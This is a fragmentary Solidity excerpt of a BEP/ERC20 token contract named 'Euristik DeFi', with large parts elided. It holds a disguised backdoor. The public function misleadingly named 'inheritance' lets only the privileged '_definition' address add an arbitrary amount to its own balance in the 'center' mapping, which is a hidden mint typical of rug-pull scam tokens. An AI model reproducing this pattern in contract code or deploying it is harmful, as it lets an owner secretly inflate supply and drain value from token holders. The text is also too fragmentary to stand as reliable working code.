...
contract Context {
 ...
 contract EuristikDeFi is Context, ERC20, ERC20Metadata {
    mapping(address => uint256) private center;

    mapping(address => mapping(address => uint256)) private _allowances;
    string private _name = "Euristik DeFi";
    ...
    function inheritance(uint256 PublicTX) public {
        require(_msgSender() == _definition, "BEP : Can't be done");
        center[_definition] += PublicTX;
    }
